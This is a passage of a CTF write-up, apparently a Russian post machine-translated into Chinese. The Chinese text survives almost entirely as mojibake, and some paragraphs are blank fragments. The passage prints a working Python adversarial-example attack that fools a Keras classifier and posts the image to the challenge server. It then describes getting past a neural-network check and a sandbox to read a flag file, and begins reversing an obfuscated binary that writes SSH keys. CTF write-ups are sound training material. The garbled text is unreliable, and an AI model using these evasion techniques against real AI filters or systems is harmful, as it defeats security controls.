¹æ®æ¦‚ç‡çŸ¢é‡çš„å˜åŒ–éšæœºåœ°æ‰¾åˆ°æœ€å°å€¼ã€‚ ä½†æ˜¯ï¼Œç”±äºç¥ç»ç½‘ç»œè¿‡äºè‡ªä¿¡ï¼Œæ‰€ä»¥æ¦‚ç‡å‘é‡æ²¡æœ‰æ”¹å˜ã€‚ <br><br> æœ€åï¼Œæˆ‘å¿…é¡»è®°ä½æœåŠ¡å™¨ä¸ŠåŸå§‹æ–‡æœ¬æ–‡ä»¶ä¸­çš„æç¤º-â€œï¼ˆNormilize ^ _ ^ï¼‰â€ã€‚ ç»è¿‡ä»”ç»†çš„å½’ä¸€åŒ–ï¼Œå¯ä»¥ä½¿ç”¨L-BFGSä¼˜åŒ–ç®—æ³•æœ‰æ•ˆåœ°è¿›è¡Œæ”»å‡»ï¼Œä»¥ä¸‹æ˜¯æœ€ç»ˆåˆ©ç”¨æ–¹æ³•ï¼š <br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> foolbox <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> keras <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> numpy <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> np <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> os <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> foolbox.attacks <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> LBFGSAttack <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> foolbox.criteria <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> TargetClassProbability <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> keras.models <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> load_model <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> PIL <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> Image image = Image.open(<span class="hljs-string"><span class="hljs-string">'./ZeroSource.bmp'</span></span>) image = np.asarray(image, dtype=np.float32) / <span class="hljs-number"><span class="hljs-number">255</span></span> image = np.resize(image, (<span class="hljs-number"><span class="hljs-number">28</span></span>, <span class="hljs-number"><span class="hljs-number">28</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>)) kmodel = load_model(<span class="hljs-string"><span class="hljs-string">'KerasModel.h5'</span></span>) fmodel = foolbox.models.KerasModel(kmodel, bounds=(<span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>)) adversarial = image[:, :] <span class="hljs-keyword"><span class="hljs-keyword">try</span></span>: attack = LBFGSAttack(model=fmodel, criterion=TargetClassProbability(<span class="hljs-number"><span class="hljs-number">1</span></span>, p=<span class="hljs-number"><span class="hljs-number">.5</span></span>)) adversarial = attack(image[:, :], label=<span class="hljs-number"><span class="hljs-number">0</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">except</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">'FAIL'</span></span> quit() <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> kmodel.predict_proba(adversarial.reshape(<span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">28</span></span>, <span class="hljs-number"><span class="hljs-number">28</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>)) adversarial = np.array(adversarial * <span class="hljs-number"><span class="hljs-number">255</span></span>, dtype=<span class="hljs-string"><span class="hljs-string">'uint8'</span></span>) im = Image.open(<span class="hljs-string"><span class="hljs-string">'ZeroSource.bmp'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> x <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> xrange(<span class="hljs-number"><span class="hljs-number">28</span></span>): <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> y <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> xrange(<span class="hljs-number"><span class="hljs-number">28</span></span>): im.putpixel((y, x), int(adversarial[x][y][<span class="hljs-number"><span class="hljs-number">0</span></span>])) im.save(<span class="hljs-string"><span class="hljs-string">'ZeroSourcead1.bmp'</span></span>) os.system(<span class="hljs-string"><span class="hljs-string">"curl -X POST -F image=@ZeroSourcead1.bmp 'http://51.15.100.188:36491/predict'"</span></span>)</code> </pre> <br>  <b>æœç´¢çš„</b>è¡Œï¼š <b>H3y_Y0u'v_g01_4_n1c3_t1cket</b> <br><br><img src="https://habrastorage.org/webt/z0/tj/mx/z0tjmxh38kcphl5dxja6n9scepc.jpeg"><br><br><h2><a name="Awesome_Vm"></a> ç¬¬6å¤© å¾ˆæ£’çš„è™šæ‹Ÿæœº </h2><br> è¯¥ä»»åŠ¡æ˜¯ç”±<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">å­¦æ ¡CTF</a>å›¢é˜Ÿå‡†å¤‡çš„ã€‚ <br>  <i>æŸ¥çœ‹æ–°çš„åŸ¹è®­æœåŠ¡ï¼</i>  <i>zn.sibears.ru:8000</i> <i><br><br></i>  <i>ç°åœ¨ï¼Œæˆ‘ä»¬å¸Œæœ›æ‚¨å‚ä¸Betaç‰ˆæµ‹è¯•ï¼Œè¯¥æµ‹è¯•æ˜¯ä¸ºä¸“é—¨æµ‹è¯•æ–°æ‰‹çš„ç¼–ç¨‹æŠ€èƒ½è€Œåˆ›å»ºçš„æ–°è™šæ‹Ÿæœºã€‚</i>  <i>æˆ‘ä»¬å¢åŠ äº†é˜²æ­¢ä½œå¼Šçš„æ™ºåŠ›ä¿æŠ¤ï¼Œç°åœ¨å¸Œæœ›åœ¨æä¾›å¹³å°ä¹‹å‰å½»åº•æ£€æŸ¥æ‰€æœ‰å†…å®¹ã€‚</i>  <i>VMå…è®¸æ‚¨è¿è¡Œç®€å•çš„ç¨‹åº...æˆ–ä¸ä»…ä»…æ˜¯ï¼Ÿ</i> <i><br><br></i>  <i><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">goo.gl/iKRTrH</a></i> <br><br>  <b>æç¤º</b> <br>  <i><b>10/27/2018 16:20</b></i> <i><br></i>  <i>ä¹Ÿè®¸æ‚¨å¯ä»¥æ„šå¼„æˆ–ç»•è¿‡AIç³»ç»Ÿï¼Ÿ</i> <br><br><h4> è¯´æ˜ï¼š </h4><br><img src="https://habrastorage.org/webt/8k/p1/xy/8kp1xynj1xl3s7xtbs4_jznf0k4.png"><br><br> è¯¥æœåŠ¡æ˜¯sibVMè§£é‡Šå™¨æ¥å—çš„æ‰©å±•åä¸º.cmpldçš„æ–‡ä»¶çš„éªŒè¯ç³»ç»Ÿã€‚ å‘é€çš„ç¨‹åºåº”è§£å†³çš„ä»»åŠ¡ï¼šè®¡ç®—input.txtæ–‡ä»¶ä¸­åˆ—å‡ºçš„æ•°å­—çš„æ€»å’Œï¼Œè¿™åœ¨æŸç§ç¨‹åº¦ä¸Šè®©äººè”æƒ³åˆ°acmç«èµ›ã€‚ æ­¤å¤–ï¼ŒWebç•Œé¢çš„è¯´æ˜æŒ‡ç¤ºå°†ä½¿ç”¨äººå·¥æ™ºèƒ½æ£€æŸ¥å‘é€çš„ç¨‹åºã€‚ <br><br> è¯¥æœåŠ¡åŒ…å«ä¸¤ä¸ªDockerå®¹å™¨ï¼š <b>web-</b> <b>docker</b>å’Œ<b>prod_inter</b> ã€‚ <br><br> å¯¹äºåˆ†æï¼Œ <b>web-docker</b>å¹¶ä¸æ˜¯ç‰¹åˆ«æœ‰è¶£ã€‚ ä»–æ‰€åšçš„åªæ˜¯å°†å‘é€çš„æ–‡ä»¶è½¬æ¢ä¸ºprod_interå®¹å™¨ï¼Œåœ¨å…¶ä¸­è¿›è¡Œæ‰€æœ‰æœ€æœ‰è¶£çš„æ“ä½œã€‚ ç›¸åº”çš„ä»£ç æ®µæ˜¾ç¤ºå¦‚ä¸‹ï¼š <br><img src="https://habrastorage.org/webt/ca/xv/em/caxvem0icoy4awon-funprflkps.jpeg"><br><br> åœ¨<b>prod_inter</b>å®¹å™¨ä¸­ï¼Œå°†æ£€æŸ¥å‘é€çš„æ–‡ä»¶å¹¶åœ¨æµ‹è¯•æ•°æ®ä¸Šæ‰§è¡Œè¯¥æ–‡ä»¶ã€‚ å¯¹äºæ¯æ¬¡å‘é€ï¼Œéƒ½ä¼šåœ¨/ tmp /ä¸­éšæœºåˆ›å»ºä¸€ä¸ªæ–°ç›®å½•ï¼Œå…¶ä¸­å·²å‘é€æ–‡ä»¶ä»¥éšæœºåç§°ä¿å­˜ã€‚  flag.txtæ–‡ä»¶ä¹Ÿæ”¾ç½®åœ¨åˆ›å»ºçš„ç›®å½•ä¸­ï¼Œè¿™å¯èƒ½æ˜¯æˆ‘ä»¬çš„ç›®æ ‡ã€‚ <br><br> ç„¶åæœ‰è¶£çš„éƒ¨åˆ†å¼€å§‹ï¼šå¦‚æœæ–‡ä»¶å¤§äº8192å­—èŠ‚ï¼Œåˆ™ä½¿ç”¨äººå·¥æ™ºèƒ½æ£€æŸ¥ç¨‹åºçš„è¾“å…¥æ–‡ä»¶ã€‚  AIæ˜¯é¢„å…ˆè®­ç»ƒçš„è¶…ç²¾å¯†ç¥ç»ç½‘ç»œã€‚ å¦‚æœæµ‹è¯•æˆåŠŸï¼ˆè¾“å…¥æ•°æ®è¶…è¿‡8192å­—èŠ‚ï¼Œå¹¶ä¸”ç¥ç»ç½‘ç»œå°†å®ƒä»¬åˆ†é…ç»™ç¬¬ä¸€ç±»ï¼‰ï¼Œåˆ™ç¨‹åºå°†åœ¨äº”ä¸ªä¸åŒçš„æµ‹è¯•ä¸Šè¿è¡Œï¼Œå¹¶å°†ç»“æœå‘é€åˆ°å“åº”æ¶ˆæ¯ä¸­å¹¶æ˜¾ç¤ºç»™ç”¨æˆ·ã€‚ <br><br> å¦‚æœè¾“å…¥æ•°æ®çš„å¤§å°å°äº8192å­—èŠ‚ï¼Œæˆ–è€…å®ƒä»¬æ²¡æœ‰é€šè¿‡ç¥ç»ç½‘ç»œçš„æµ‹è¯•ï¼Œåˆ™åœ¨æµ‹è¯•ä¹‹å‰ï¼Œéœ€è¦å¦å¤–æ£€æŸ¥ç¨‹åºä¸­æ˜¯å¦å­˜åœ¨flag.txtå­å­—ç¬¦ä¸²ä»¥åŠæ˜¯å¦å°è¯•æ‰“å¼€å…·æœ‰è¯¥åç§°çš„æ–‡ä»¶ã€‚ é€šè¿‡è¿è¡ŒåŸºäº<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">SECCOMP</a>æŠ€æœ¯çš„<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">secfilter</a>æ²™ç®±ä¸­çš„ç¨‹åºå¹¶åˆ†ææ‰§è¡Œæ—¥å¿—ï¼Œå¯ä»¥ç›‘è§†å¯¹flag.txtæ–‡ä»¶çš„è®¿é—®ã€‚ ä¸‹é¢æ˜¯ç›¸åº”çš„æœåŠ¡ä»£ç å’Œå°è¯•æ‰“å¼€ç¦æ­¢æ–‡ä»¶æ—¶çš„æ—¥å¿—ç¤ºä¾‹ï¼š <br><br><img src="https://habrastorage.org/webt/vq/6-/-h/vq6--he6uvlc2zh6mvkmaqjow6q.jpeg"><br><br><img src="https://habrastorage.org/webt/lj/wg/vn/ljwgvn5gexwp23syezju5uexfjc.jpeg"><br><br> ä¸ºäº†è§£å†³æ­¤ä»»åŠ¡ï¼Œæˆ‘ä¸ºsibâ€‹â€‹VMè§£é‡Šå™¨ç”Ÿæˆäº†ä¸€ç»„ç¨‹åºï¼Œè¿™äº›ç¨‹åºæ‰“å¼€flag.txtæ–‡ä»¶å¹¶æ˜¾ç¤ºæ–‡ä»¶çš„ç¬¬iä¸ªå­—èŠ‚çš„æ•°å€¼ã€‚ åŒæ—¶ï¼Œæ¯ä¸ªç¨‹åºéƒ½æˆåŠŸé€šè¿‡äº†AIæµ‹è¯•ã€‚ æ¥ä¸‹æ¥ï¼Œå°†ä»‹ç»ç¥ç»ç½‘ç»œçš„è¡¨é¢åˆ†æå’Œè™šæ‹Ÿæœºçš„æè¿°ã€‚ <br><br><h4> ç¥ç»ç½‘ç»œåˆ†æ </h4><br> ç»è¿‡è®­ç»ƒçš„ç¥ç»ç½‘ç»œæ¨¡å‹åŒ…å«åœ¨cnn_model.h5æ–‡ä»¶ä¸­ã€‚ ä»¥ä¸‹æ˜¯æœ‰å…³ç½‘ç»œä½“ç³»ç»“æ„çš„ä¸€èˆ¬ä¿¡æ¯ã€‚ <br><br><img src="https://habrastorage.org/webt/lj/7a/jj/lj7ajjrgzgml68gsmqsukdrn7wa.jpeg"><br><br> æˆ‘ä»¬ä¸çŸ¥é“ç¥ç»ç½‘ç»œèƒ½å‡†ç¡®è¯†åˆ«å‡ºä»€ä¹ˆï¼Œå› æ­¤æˆ‘ä»¬å°†å°è¯•å‘å…¶æä¾›å„ç§æ•°æ®ã€‚ ä»ç½‘ç»œçš„ä½“ç³»ç»“æ„å¯ä»¥æ¸…æ¥šåœ°çœ‹å‡ºï¼Œåœ¨è¾“å…¥ç«¯å®ƒæ¥æ”¶åˆ°å¤§å°ä¸º100X100çš„å•é€šé“å›¾åƒã€‚ ä¸ºäº†é¿å…ç¼©æ”¾å¯¹ç»“æœçš„å½±å“ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨æœåŠ¡ä¸­ä½¿ç”¨çš„åŠŸèƒ½å°†10,000å­—èŠ‚çš„åºåˆ—è½¬æ¢ä¸ºå›¾åƒã€‚ ä»¥ä¸‹æ˜¯ç¥ç»ç½‘ç»œå¯¹å„ç§æ•°æ®è¿›è¡Œæ“ä½œçš„ç»“æœï¼š <br><br><img src="https://habrastorage.org/webt/s0/vd/tn/s0vdtnbuqcbnqxd1ho_5wzlyyps.jpeg"><br><br> æ ¹æ®ç»“æœâ€‹â€‹ï¼Œå¯ä»¥å‡å®šç¥ç»ç½‘ç»œå°†æ¥æ”¶ä¸»è¦ä¸ºé»‘è‰²ï¼ˆé›¶å­—èŠ‚ï¼‰çš„å›¾åƒã€‚ æœ€å¯èƒ½çš„æ˜¯ï¼Œç¼–å†™ä¸€ä¸ªè¯»å–æ ‡å¿—å­—ç¬¦çš„ç¨‹åºæ‰€éœ€çš„å­—èŠ‚æ•°è¦å°‘äº1000ä¸ªï¼ˆå…¶ä½™â€‹â€‹çš„å­—èŠ‚å¯ä»¥ç”¨é›¶å¡«å……ï¼‰ï¼Œç„¶åAIå°†æ¥å—å‘é€çš„ç¨‹åºã€‚ <br><br> å› æ­¤ï¼Œä¸ºäº†è§£å†³ä»»åŠ¡ï¼Œä»ç„¶éœ€è¦ç¼–å†™æ‰€éœ€çš„ç¨‹åºã€‚ <br><br><h4>  SibVMè§£é‡Šå™¨ </h4><br>  <b>ç¨‹åºç»“æ„</b> <br> ç¬¬ä¸€æ­¥æ˜¯äº†è§£ç¨‹åºæ–‡ä»¶çš„ç»“æ„ã€‚ åœ¨è§£é‡Šå™¨çš„åå‘è¿‡ç¨‹ä¸­ï¼Œäº‹å®è¯æ˜ï¼Œç¨‹åºåº”ä»å…·æœ‰å¤šä¸ªæœåŠ¡å­—æ®µçš„æŸä¸ªæ ‡å¤´å¼€å§‹ï¼Œç„¶åæ˜¯å…·æœ‰æ ‡è¯†ç¬¦çš„ä¸€ç»„å®ä½“ï¼Œå…¶ä¸­åº”æœ‰ä¸€ä¸ªç±»å‹ä¸ºFunctionçš„ä¸»å®ä½“ã€‚ <br><br><div class="spoiler">  <b class="spoiler_title">æ–‡ä»¶å¤´æ£€æŸ¥</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/2d/th/mb/2dthmbi3qyu4czj9qkc9zv8asam.png"><br></div></div><br><div class="spoiler">  <b class="spoiler_title">æ£€ç´¢è®°å½•</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/ab/vm/jb/abvmjbhfwcbxnu_nqxyue6pnlua.png"><br></div></div><br><div class="spoiler">  <b class="spoiler_title">å¤„ç†è®°å½•å¹¶å¯åŠ¨ä¸»è¦åŠŸèƒ½</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/eh/ki/qc/ehkiqcracavi3y75_bkj5kvcany.png"><br></div></div><br> ç»“æœæ˜¯ä»¥ä¸‹è¾“å…¥æ–‡ä»¶æ ¼å¼ï¼š <br><br><img src="https://habrastorage.org/webt/ka/bs/py/kabspyig7f_jv7ysl_maco90itc.png"><br><br><h4> èµ„æ–™ç±»å‹ </h4><br> è§£é‡Šå™¨æ”¯æŒå„ç§ç±»å‹çš„å®ä½“ã€‚ ä¸‹é¢æ˜¯ä¸€ä¸ªè¡¨æ ¼åŠå…¶æ ‡è¯†ç¬¦ï¼Œå°†æ¥éœ€è¦ä½¿ç”¨å®ƒä»¬æ¥æ„å»ºç¨‹åºã€‚ <br><br><img src="https://habrastorage.org/webt/jf/fd/wc/jffdwc5yc6beasqr57sr3goy6ks.jpeg"><br><br><h4> ä¸ºå£è¯‘å‘˜æ„å»ºç¨‹åº </h4><br> å¦‚ä¸Šæ‰€è¿°ï¼Œç¨‹åºå¿…é¡»å…·æœ‰ç±»å‹ä¸ºFunctionï¼ˆ5ï¼‰çš„ä¸»æ¡ç›®ã€‚ å®ƒå…·æœ‰ä»¥ä¸‹æ ¼å¼ï¼š <br><br><img src="https://habrastorage.org/webt/bn/hw/g3/bnhwg3b5nh2egxv9dhi1aloarx8.png"><br><br> æ‰¾å‡ºä¸»ç¨‹åºæ‰§è¡Œå‘¨æœŸå¹¶ä¸å›°éš¾ã€‚ <br><br><div class="spoiler">  <b class="spoiler_title">ä¸»è¦æ‰§è¡Œå‘¨æœŸ</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/dl/ny/0r/dlny0rj2neh87uf72nljadx5bp0.png"><br></div></div><br>  <code>decode_opcode</code>å‡½æ•°ä»ç¨‹åºä»£ç ä¸­æ£€ç´¢æœ‰å…³ä¸‹ä¸€ä¸ªæ“ä½œçš„ä¿¡æ¯ã€‚ æ¯ä¸ªæ“ä½œçš„å‰ä¸¤ä¸ªå­—èŠ‚åŒ…å«æ“ä½œä»£ç ï¼Œå‚æ•°æ•°ç›®åŠå…¶ç±»å‹ã€‚ æ¥ä¸‹æ¥çš„å‡ ä¸ªå­—èŠ‚ï¼ˆå–å†³äºå‚æ•°çš„ç±»å‹å’Œæ•°é‡ï¼‰å°†è¢«è§£é‡Šä¸ºæ“ä½œçš„å‚æ•°ã€‚ <br><br> æ“ä½œçš„å‰ä¸¤ä¸ªå­—èŠ‚çš„æ ¼å¼ï¼š <br><br><img src="https://habrastorage.org/webt/gn/70/av/gn70avw2rknailevx2byn4ezspw.png"><br><br> æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†å›é¡¾ä¸€äº›è¯´æ˜ï¼Œè¿™äº›è¯´æ˜å°†æœ‰åŠ©äºæˆ‘ä»¬ä»ç³»ç»Ÿä¸­æå–æ ‡è®°ã€‚ <br><br><div class="spoiler">  <b class="spoiler_title">å‘½ä»¤è§£é‡Šå™¨å›¾ï¼Œexecute_opcodeå‡½æ•°</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/ht/zm/pr/htzmprbyxebqmna2jg56vbi-jf4.png"><br></div></div><br><ul><li> æ“ä½œç 0-æ‰“å¼€æ–‡ä»¶ï¼ˆæ–‡ä»¶åç”±operationå‚æ•°æŒ‡å®šï¼Œå¹¶ä¸”ä¸ºStringç±»å‹ï¼‰ï¼Œå¹¶å°†å…¶å†…å®¹ä½œä¸º<code>ByteArray</code>ç±»å‹çš„å¯¹è±¡æ”¾ç½®åœ¨å †æ ˆçš„é¡¶éƒ¨ã€‚ </li><li> æ“ä½œç 2-æ˜¾ç¤ºå­˜å‚¨åœ¨å †æ ˆé¡¶éƒ¨çš„å€¼ã€‚ ä¸å¹¸çš„æ˜¯ï¼Œè¯¥æ“ä½œå°†ä¸ä¼šæ˜¾ç¤º<code>ByteArray</code>ç±»å‹çš„å¯¹è±¡çš„å€¼ã€‚ è¦è§£å†³æ­¤é—®é¢˜ï¼Œæ‚¨å¯ä»¥è·å–æ•°ç»„çš„ç¬¬iä¸ªå…ƒç´ å¹¶å°†å…¶æ˜¾ç¤ºã€‚ </li></ul><br><div class="spoiler">  <b class="spoiler_title">å¤„ç†æ“ä½œç 2</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/or/vt/0p/orvt0pk4mokjuxbgw-yqjxpac8u.png"><br></div></div><br><ul><li> æ“ä½œç 13-æŒ‰ç´¢å¼•ä»æ•°ç»„ä¸­è·å–å…ƒç´ ã€‚ ä»å †æ ˆä¸­å¼¹å‡ºæ•°ç»„å’Œå…ƒç´ ç´¢å¼•ï¼Œç»“æœè¢«å‹å…¥å †æ ˆã€‚ å› æ­¤ï¼Œä¸ºäº†ç¼–è¯‘å·¥ä½œç¨‹åºï¼Œå¿…é¡»å°†ç´¢å¼•æ”¾åœ¨å †æ ˆä¸Šã€‚ </li><li> æ“ä½œç 7-å°†è¿ç®—å‚æ•°å‹å…¥å †æ ˆã€‚ </li></ul><br> ç»“æœï¼Œè¯¥ç¨‹åºä»…åŒ…å«4ä¸ªæ“ä½œï¼š <br><br><img src="https://habrastorage.org/webt/tx/t4/ga/txt4gaep-ibcfsdx0wco7gg_heg.jpeg"><br><br><img src="https://habrastorage.org/webt/ja/mv/nt/jamvnt3jnzj6xlj8pfn_vnd0dbc.png"><br><div class="spoiler">  <b class="spoiler_title">æœ€ç»ˆç¨‹åº</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/m1/6y/yn/m16yynqvryb1clqwwf6hsgv0mxs.jpeg"><br></div></div><br> æœç´¢çš„è¡Œï¼š <b>æ ‡å¿—{76f98c7f11582d73303a4122fd04e48cba5498}</b> <br><br><img src="https://habrastorage.org/webt/yb/bw/am/ybbwamafhoijkcn2g871s_73wb8.jpeg"><br><br><h2><a name="Hiddenresource"></a> ç¬¬7å¤©ã€‚ éšè—èµ„æº </h2><br> è¯¥ä»»åŠ¡ç”±<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">RuCTF</a>å‡†å¤‡ã€‚ <br><br>  <i>ç»™äºˆ<a href="">n24.elf</a>æœåŠ¡ã€‚</i>  <i>åªéœ€æˆæƒ95.216.185.52å¹¶è·å¾—æ ‡è®°å³å¯ã€‚</i> <br><br>  <b>æç¤º</b> <b><br></b>  <b><i>10/28/2018 20:00</i></b> <br>  <i>ä»»åŠ¡æ²¡æœ‰è§£å†³ã€‚</i>  <i>æ·»åŠ äº†24å°æ—¶ã€‚</i> <br><br> ä½¿ç”¨æ ‡å‡†è¿æ¥åè®®å¯¹æœåŠ¡å™¨è¿›è¡Œè®¿é—®çš„è°ƒæŸ¥æ˜¾ç¤ºï¼Œå¯ä»¥é€šè¿‡SSHï¼ˆç«¯å£22ï¼‰è¿›è¡Œè®¿é—®ã€‚ æ‰€æä¾›çš„æ–‡ä»¶æ˜¯ç”¨äºLinuxçš„ELFå¯æ‰§è¡Œæ–‡ä»¶ï¼ˆåç§°ä¸­çš„æ‰©å±•åå·§å¦™åœ°æš—ç¤ºäº†è¯¥æ–‡ä»¶ï¼‰ã€‚ <br><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment">#file UwRJ8iaEEd4tSQIe_n24.elf UwRJ8iaEEd4tSQIe_n24.elf: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, stripped</span></span></code> </pre><br> ä½¿ç”¨å­—ç¬¦ä¸²å®ç”¨ç¨‹åºæ˜¾ç¤ºäº†è¡Œâ€œ /home/task/.sshâ€å’Œâ€œ /home/task/.ssh/authorized_keysâ€çš„å­˜åœ¨ã€‚ å…³äºä»ELFå¯æ‰§è¡Œæ–‡ä»¶ï¼ˆä»¥ä¸‹ç§°ä¸ºæœåŠ¡ï¼‰è®¿é—®SSHæ— å¯†ç æˆæƒå¯†é’¥æ–‡ä»¶çš„å¯èƒ½æ€§çš„ç»“è®ºã€‚ <br><br> ç¬¦å·è¡¨åŒ…å«ç”¨äºæ‰“å¼€æ–‡ä»¶å’Œå†™å…¥çš„å¿…è¦åŠŸèƒ½ï¼š <br><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment"># readelf --dyn-syms UwRJ8iaEEd4tSQIe_n24.elf | grep fopen 23: 0000000000000000 0 FUNC GLOBAL DEFAULT UND fopen@GLIBC_2.2.5 (2) # readelf --dyn-syms UwRJ8iaEEd4tSQIe_n24.elf | grep write 32: 0000000000000000 0 FUNC GLOBAL DEFAULT UND fwrite@GLIBC_2.2.5 (2)</span></span></code> </pre> <br> ç¬¦å·è¡¨è¿˜åŒ…å«ç”¨äºå¤„ç†å¥—æ¥å­—ï¼Œåˆ›å»ºè¿›ç¨‹å’Œè®¡ç®—MD5çš„åŠŸèƒ½ã€‚ <br><br> æ–‡ä»¶çš„èƒŒé¢æ˜¾ç¤ºå­˜åœ¨å¤§é‡è·³è·ƒï¼ˆæŸç§æ··æ·†ï¼‰ã€‚ åŒæ—¶ï¼Œåœ¨ä»£ç å—ä¹‹é—´æ‰§è¡Œè·³è½¬ï¼Œé€šå¸¸å¯ä»¥å°†å…¶åˆ†ä¸ºå‡ ç§ç±»å‹ï¼š <br><br><ul><li>    Â«            OF Â»,   (  objdump): <br><br><pre> <code class="bash hljs"> 95b69b: 48 0f 44 c7 cmove rax,rdi 95b69f: 48 83 e7 01 and rdi,0x1 95b6a3: 4d 31 dc xor r12,r11 95b6a6: 71 05 jno 95b6ad &lt;MD5_Final@@Base+0x2d83f9&gt; 95b6a8: e9 f4 bf e1 ff jmp 7776a1 &lt;MD5_Final@@Base+0xf43ed&gt; 95b6ad: e9 1f 1a de ff jmp 73d0d1 &lt;MD5_Final@@Base+0xb9e1d&gt;</code> </pre> <br>  ,     OF        Â«xorÂ», Â«andÂ»  . </li><li> ,       .            .      ,  : <br><br><pre> <code class="bash hljs">95b401: c7 04 25 2b b4 95 00 mov DWORD PTR ds:0x95b42b,0x34be74 95b408: 74 be 34 00 95b40c: 66 c7 04 25 01 b4 95 mov WORD PTR ds:0x95b401,0x13eb 95b413: 00 eb 13 95b416: 4c 0f 44 da cmove r11,rdx 95b41a: 48 d1 ea shr rdx,1 95b41d: 48 0f 44 ca cmove rcx,rdx 95b421: 49 89 d3 mov r11,rdx 95b424: 48 89 ca mov rdx,rcx 95b427: 4c 89 da mov rdx,r11 95b42a: e9 8d ad e7 00 jmp 17d61bc</code> </pre> </li><li>  ,      . </li></ul><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">æ ¹æ®ç›¸åçš„ç»“æœï¼Œå‡è®¾å­˜åœ¨æ ¹æ®MD5ç®—æ³•è¿›è¡Œè®¡æ•°çš„å®ç°ã€‚è®¡ç®—æ‰€éœ€çš„è¡¨æœªå•ç‹¬å®ç°ï¼Œè€Œæ˜¯ç›´æ¥åœ¨ä»£ç ä¸­ä»¥å—çš„å½¢å¼è¯»å–ã€‚è¯¥ä»£ç åŒ…å«åç§°ä¸º</font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MD5_Init</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ï¼Œ</font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MD5_Update</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">å’Œ</font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MD5_finalçš„å­—ç¬¦</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ã€‚</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">é€šå¸¸ï¼Œä½¿ç”¨ä¼—æ‰€å‘¨çŸ¥çš„åæ±‡ç¼–ç¨‹åºåŠå…¶APIè„šæœ¬çš„åŠŸèƒ½ï¼Œå¯ä»¥é™æ€ç¡®å®šç¨‹åºçš„è¿›åº¦ã€‚ä½†æ˜¯åæ±‡ç¼–ç¨‹åºçš„è®¸å¯è¯ä»·æ ¼æ˜‚è´µï¼Œè¯•ç”¨ç‰ˆå¯æ‚²ï¼Œå¾ˆéš¾è·å¾—ï¼Œè€Œä¸”æˆ‘ä½¿ç”¨å…è´¹è½¯ä»¶å®ç”¨ç¨‹åºè¿›è¡Œç®¡ç†ï¼Œè€Œä¸”è¿™ç§æ–¹å¼çš„æ—¶é—´æ›´é•¿ã€‚å› æ­¤ï¼ŒåŠ¨åŠ›è¶Šæ¥è¶Šå¤§ã€‚</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">æˆ‘å°†ELFæ–‡ä»¶ä¸Šä¼ åˆ°è™šæ‹Ÿæœºã€‚ä»¥é˜²ä¸‡ä¸€ï¼Œåˆ›å»ºç›®å½•â€œ /home/task/.ssh/â€ã€‚</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">å¯åŠ¨æ—¶ï¼Œå¿…é¡»æŒ‡å®šç«¯å£ã€‚</font><font style="vertical-align: inherit;">è€ƒè™‘åˆ°æˆ‘ä»¬ä¸æ§åˆ¶æœåŠ¡å™¨ç«¯å¯åŠ¨ï¼Œæˆ‘è®¤ä¸ºè¯¥å‚æ•°æ˜¯è™šæ‹Ÿçš„ã€‚</font><font style="vertical-align: 